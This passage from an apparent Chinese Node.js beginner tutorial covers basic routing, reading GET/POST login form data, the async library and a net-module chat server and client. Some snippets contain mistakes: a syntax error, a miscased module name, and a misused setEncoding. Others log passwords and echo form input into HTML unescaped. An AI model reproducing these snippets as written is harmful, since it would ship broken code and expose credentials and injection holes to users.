class="attr">src</span>=<span class="string">"./img"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>file.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">//读html文件</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  readFile: <span class="function">(<span class="params">file, res</span>) =&gt;</span> &#123; </span><br><span class="line">    fs.readFile(file, <span class="string">'utf-8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">          res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html; charset=utf-8'</span>&#125;)</span><br><span class="line">          res.write(data)</span><br><span class="line">          res.end()</span><br><span class="line">  &#125;)&#125;,</span><br><span class="line">  readImg: <span class="function">(<span class="params">file, res</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.readFile(file, <span class="string">'binary'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">      res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'image/jpeg'</span>&#125;)</span><br><span class="line">      res.write(data, <span class="string">'binary'</span>)</span><br><span class="line">      res.end()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  home: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//res.write("欢迎来到首页")  // 默认路由</span></span><br><span class="line">    file.readFile(<span class="string">'./views/home.html'</span>, res)</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"登录界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  registor: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.write(<span class="string">"注册界面"</span>)  <span class="comment">// 处理路由</span></span><br><span class="line">  &#125;,</span><br><span class="line">  img: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//读取文件，也新建一个模块</span></span><br><span class="line">    file.readImg(<span class="string">'./images/1.jpg'</span>, res)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>router_03.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> route = <span class="built_in">require</span>(<span class="string">'./modules/route.js'</span>)</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.url !== <span class="string">'/favicon.ico'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> pathName = url.parse(req.url).pathname.replace(<span class="regexp">/\//</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(pathName);</span><br><span class="line">    <span class="keyword">try</span>&#123;  <span class="comment">//最简单的异常处理</span></span><br><span class="line">      route[pathName](req, res)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">      route[<span class="string">'home'</span>](req, res)  <span class="comment">//默认路由，如果不存在哪个路由，就返回这个路由</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//res.end()</span></span><br><span class="line">&#125;).listen(<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://localhost:8000'</span>);</span><br></pre></td></tr></table></figure><h6 id="路由传递参数"><a href="#路由传递参数" class="headerlink" title="路由传递参数"></a>路由传递参数</h6><p><strong>1.get方式</strong></p><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./login"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span></span><br><span class="line">    邮箱: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">    密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><p>toute.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> urlObject = url.parse(req.url, <span class="literal">true</span>).query  <span class="comment">// 通过url解析html表单数据</span></span><br><span class="line">    <span class="built_in">console</span>.log(urlObject.email)</span><br><span class="line">    <span class="built_in">console</span>.log(urlObject.password)</span><br><span class="line">    file.readFile(<span class="string">'./views/login.html'</span>, res, req)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.post方式</strong></p><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> file = <span class="built_in">require</span>(<span class="string">'./file.js'</span>)</span><br><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>)</span><br><span class="line"><span class="keyword">var</span> queryString = <span class="built_in">require</span>(<span class="string">'queryString'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//post方式</span></span><br><span class="line">    <span class="keyword">var</span> post = <span class="string">''</span></span><br><span class="line">    req.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">      post += chunk</span><br><span class="line">    &#125;)</span><br><span class="line">    req.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">      <span class="keyword">var</span> urlObject = queryString.parse(post) <span class="comment">//返回一个url对象</span></span><br><span class="line">      <span class="built_in">console</span>.log(urlObject.email);</span><br><span class="line">      <span class="built_in">console</span>.log(urlObject.password);</span><br><span class="line">    &#125;)</span><br><span class="line">    file.readFile(<span class="string">'./views/login.html'</span>, res, req)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输入的内容回显到本页面</strong></p><p>file.js    </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  postReadFile:  <span class="function">(<span class="params">file, res, req, post</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> urlObject = queryString.parse(post)</span><br><span class="line">    <span class="keyword">var</span> array = [<span class="string">'email'</span>, <span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">var</span> reg;</span><br><span class="line"></span><br><span class="line">    fs.readFile(file, <span class="string">'utf-8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">          res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>:<span class="string">'text/html; charset=utf-8'</span>&#125;)</span><br><span class="line">          <span class="comment">//处理</span></span><br><span class="line">          <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;array.length; i++)&#123;</span><br><span class="line">            reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;'</span> + array[i] + <span class="string">'&#125;'</span>, <span class="string">'gi'</span>)</span><br><span class="line">            data = data.replace(reg, urlObject[array[i]])</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(urlObject.email &amp;&amp; urlObject.password)&#123;</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;infoClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">''</span>)</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;formClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">'hide'</span>)</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;infoClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">'hide'</span>)</span><br><span class="line">            data = data.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'&#123;formClass&#125;'</span>, <span class="string">'gi'</span>), <span class="string">''</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          res.write(data)</span><br><span class="line">          res.end()</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>route.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">login: <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//post方式</span></span><br><span class="line">  <span class="keyword">var</span> post = <span class="string">''</span>;</span><br><span class="line">  req.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">    post += chunk</span><br><span class="line">  &#125;)</span><br><span class="line">  req.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">    file.postReadFile(<span class="string">'./views/login.html'</span>, res, req, post)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>login.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"&#123;infoClass&#125;"</span>&gt;</span></span><br><span class="line">  Email:&#123;email&#125; <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  密码:&#123;password&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./login"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"formClass"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"email"</span>&gt;</span></span><br><span class="line">    邮箱: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">    密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="async"><a href="#async" class="headerlink" title="async"></a>async</h4><p><code>npm install async -D</code></p><p>常用功能:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.串行无关联(第一个参数是数组，第二个参数是个回调函数)</span></span><br><span class="line"><span class="comment">//运行时间是两个运行时间总和</span></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'test'</span>)</span><br><span class="line"><span class="keyword">async</span>.series([</span><br><span class="line">  (callback) =&gt; &#123; <span class="comment">//数组的第一个元素</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>,<span class="string">'one'</span>)</span><br><span class="line">    &#125;,<span class="number">200</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  (callback)=&gt;&#123; <span class="comment">//数组的第一个元素</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>,<span class="string">'two'</span>)</span><br><span class="line">    &#125;,<span class="number">5000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br><span class="line">(err, results) =&gt; &#123;  <span class="comment">// 第二个参数</span></span><br><span class="line">  <span class="built_in">console</span>.log(results);</span><br><span class="line">  <span class="built_in">console</span>.timeEnd(<span class="string">'test'</span>) <span class="comment">//看一下执行时间</span></span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.串行无关联(第二种用法，第一个参数是对象)</span></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'test'</span>)</span><br><span class="line"><span class="keyword">async</span>.series(&#123;</span><br><span class="line">  one: <span class="function">(<span class="params">callback</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'1'</span>)</span><br><span class="line">    &#125;,<span class="number">2000</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  two: <span class="function">(<span class="params">callback</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'2'</span>)</span><br><span class="line">    ,<span class="number">3000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;, (err, results) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(results);</span><br><span class="line">    <span class="built_in">console</span>.timeEnd(<span class="string">'test'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.并行无关联（第一个参数是数组）</span></span><br><span class="line"><span class="comment">//时间取最长的</span></span><br><span class="line"><span class="keyword">async</span>.parallel([</span><br><span class="line">  (callback) =&gt; &#123;</span><br><span class="line">    setTimeout( <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'one'</span>)</span><br><span class="line">    &#125;,<span class="number">2000</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  (callback) =&gt; &#123;</span><br><span class="line">    setTimeout( <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">      callback(<span class="literal">null</span>, <span class="string">'two'</span>)</span><br><span class="line">    &#125;,<span class="number">5000</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">], (err,results)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(results);</span><br><span class="line">  <span class="built_in">console</span>.timeEnd(<span class="string">'test'</span>)   <span class="comment">//运行时间5s，取最长的</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//也可以第一个参数是对象</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4.串行有关联</span></span><br><span class="line"><span class="keyword">async</span>.waterfall([</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>)</span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>,<span class="string">'one'</span>,<span class="string">'two'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">arr1,arr2,callback</span>)</span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>, arr1,arr2,<span class="string">'three'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">arr1,arr2,arr3,callback</span>)</span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>, [arr1,arr2,arr3,<span class="string">'done'</span>])</span><br><span class="line">  &#125;</span><br><span class="line">],<span class="function"><span class="keyword">function</span>(<span class="params">err,results</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(results);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//这里没加异步，按照串行顺序依次下来的</span></span><br></pre></td></tr></table></figure><h2 id="六-Socket"><a href="#六-Socket" class="headerlink" title="六. Socket"></a>六. Socket</h2><p><img src="/Node-js-入门/socket.png"></p><h4 id="1-基于net模块实现socket"><a href="#1-基于net模块实现socket" class="headerlink" title="1). 基于net模块实现socket"></a>1). 基于<code>net</code>模块实现socket</h4><p><strong>聊天案例</strong></p><p>server.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>)</span><br><span class="line"><span class="keyword">var</span> chatServer = net.createServer(),</span><br><span class="line">    clientMap = <span class="keyword">new</span> <span class="built_in">Object</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="number">0</span>; <span class="comment">//客户端连接流水号</span></span><br><span class="line">chatServer.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">client</span>)</span>&#123;</span><br><span class="line">  client.name = ++i</span><br><span class="line">  clientMap[client.name] = client</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"客户端 "</span>+ client.name +<span class="string">" 连接成功~"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//对客户端发送消息的监听</span></span><br><span class="line">  client.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"客户端传来："</span> + data);</span><br><span class="line">    broadcast(data, client) <span class="comment">//广播给其他</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//数据错误的处理</span></span><br><span class="line">  client.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"client error: "</span> + err);</span><br><span class="line">    client.end()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//客户端关闭事件</span></span><br><span class="line">  client.on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">delete</span> clientMap[client.name]</span><br><span class="line">      <span class="built_in">console</span>.log(client.name + <span class="string">"下线了"</span>);</span><br><span class="line">      broadcast(client.name+<span class="string">"下线了"</span>, client) <span class="comment">//广播给其他</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">chatServer.listen(<span class="number">9000</span>)  <span class="comment">//监听端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//消息广播</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">broadcast</span> (<span class="params">message, client</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> clientMap)&#123;</span><br><span class="line">    clientMap[key].write(client.name + <span class="string">' say:'</span> + message + <span class="string">"\n"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>)</span><br><span class="line"><span class="keyword">var</span> port = <span class="number">9000</span></span><br><span class="line"><span class="keyword">var</span> host = <span class="string">'127.0.0.1'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket()</span><br><span class="line">client.setEncoding = <span class="string">'UTF-8'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line">client.connect(port, host, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  client.write(<span class="string">"您好"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听服务端消息</span></span><br><span class="line">client.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"服务端传来："</span> + data);</span><br><span class="line">  say()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">client.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">client.on(<span 